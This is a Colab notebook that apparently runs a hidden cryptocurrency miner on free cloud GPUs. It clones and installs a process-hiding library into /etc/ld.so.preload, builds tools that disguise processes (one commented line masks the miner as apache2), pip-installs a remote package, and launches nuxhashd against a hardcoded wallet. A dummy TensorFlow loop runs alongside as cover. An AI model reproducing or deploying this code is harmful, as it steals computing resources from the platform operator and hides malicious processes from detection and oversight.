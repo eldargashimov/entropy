{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "______",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "t5xYj2LJjhg4",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "1ef0805a-f072-4756-c6fa-eae823866673"
      },
      "source": [
        "# ================== НАСТРОЙКИ ===================\n",
        "wallet = '39wWwTwp4Vq3vq3vTqzvsV6zym5EP5Fiv4'\n",
        "rep_url = 'git+https://github.com/kllmagn/entropy'\n",
        "# ================================================\n",
        "\n",
        "from threading import Thread\n",
        "!git clone https://github.com/gianlucaborello/libprocesshider\n",
        "%cd libprocesshider\n",
        "!sed -i -- 's/evil_script.py/excavator/g' processhider.c\n",
        "!make\n",
        "!gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl\n",
        "!sudo mv libprocesshider.so /usr/local/lib/\n",
        "!sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload\n",
        "%cd ..\n",
        "\n",
        "!git clone https://github.com/emptymonkey/ptrace_do.git\n",
        "%cd ptrace_do\n",
        "!make\n",
        "%cd ..\n",
        "\n",
        "!git clone https://github.com/emptymonkey/mimic.git\n",
        "%cd mimic\n",
        "!make\n",
        "!sudo pip3 install $rep_url\n",
        "worker = !curl ipecho.net/plain\n",
        "worker = str(worker[0]).replace('.','-')\n",
        "print(f'Running {worker}')\n",
        "\n",
        "def _nux():\n",
        "  !nuxhashd -w $wallet -wn $worker -rg usa\n",
        "\n",
        "nux = Thread(target=_nux)\n",
        "nux.daemon = True\n",
        "nux.start()\n",
        "#!sudo ./mimic -b -m \"/usr/sbin/apache2 -k start\" -e \"/usr/bin/python3 /usr/local/bin/nuxhashd -w 39wWwTwp4Vq3vq3vTqzvsV6zym5EP5Fiv4 -wn $worker -rg usa\"\n",
        "\n",
        "%tensorflow_version 2.x\n",
        "import tensorflow as tf\n",
        "import timeit\n",
        "import time\n",
        "print('Dummy has started!')\n",
        "tf.get_logger().setLevel('INFO')\n",
        "gpus = tf.config.experimental.list_physical_devices('GPU')\n",
        "gpu = gpus[0]\n",
        "\n",
        "while nux.is_alive():\n",
        "  with tf.device('/device:GPU:0'):\n",
        "    random_image_gpu = tf.random.normal((100, 100, 100, 3))\n",
        "    net_gpu = tf.compat.v1.layers.conv2d(random_image_gpu, 128, 7)\n",
        "    net_gpu = tf.math.reduce_sum(net_gpu)\n",
        "  time.sleep(0.5)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Have a nice day!"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}
